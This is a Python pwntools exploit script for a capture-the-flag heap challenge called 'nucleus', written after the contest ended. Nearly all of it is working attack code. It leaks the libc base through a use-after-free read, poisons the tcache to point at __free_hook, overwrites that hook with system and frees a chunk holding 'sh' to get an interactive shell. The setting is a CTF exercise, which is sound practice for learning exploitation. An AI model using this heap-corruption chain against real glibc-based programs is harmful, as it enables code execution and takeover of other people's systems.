#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template

"""
This has been solved after the end of the CTF.
"""

from pwn import *

context.update(arch='amd64')
context.update(log_level=f'{logging.DEBUG}')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

exe = './nucleus'
env = {'LD_PRELOAD':'./libc.so.6'}

def compress(d: bytes) -> str:
    io.sendlineafter('> ', '1')
    io.sendlineafter(': ', d)
    io.recvuntil('text: ')
    return str(io.recvline())

def decompress(d: bytes) -> str:
    io.sendlineafter('> ', '2')
    io.sendlineafter('text: ', d)
    io.recvuntil('text: ')
    return str(io.recvline())

def cleanup(choice: str, idx: int) -> str:
    io.sendlineafter('> ', '3')
    io.sendlineafter('(c/d): ', choice)
    io.sendlineafter('Idx: ', str(idx))

def show(idx: int) -> bytes:
    io.sendlineafter('> ', '5')
    io.sendlineafter('Idx: ', str(idx))
    io.recvuntil('content: ')
    return io.recvline()

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, env=env, *a, **kw)


gdbscript = '''
b decompress
# b compress
#heap chunks
'''.format(**locals())

libc = ELF('./libc.so.6')

io = start()

compress(b'A'*800)
compress(b'B'*20)

cleanup('c', 0)
cleanup('c', 1)


r = u64(show('0')[:6].ljust(8, b'\x00'))
libc.address = r - 0x1ecbe0
log.info(f'libc base: {hex(libc.address)}')


# every chunks should have 0x50 size

# fill tcache bine
decompress(b'A'*30) 
decompress(b'B'*30)
decompress(b'C'*30)

cleanup('d', 2)
cleanup('d', 1)
cleanup('d', 0)

# overwriting next tcache bin's size and fd pointers to __free_hook

# this is a clear sign of hacky padding
decompress(b'sh\x00' + b'$58A$11A' + p64(0x51) + p64(libc.sym.__free_hook)*2)

decompress(b'B'*30)

# set *__free_hook = __libc_system
decompress(p64(libc.sym.system) + b'C'*22)

cleanup('d', 3)

io.interactive()
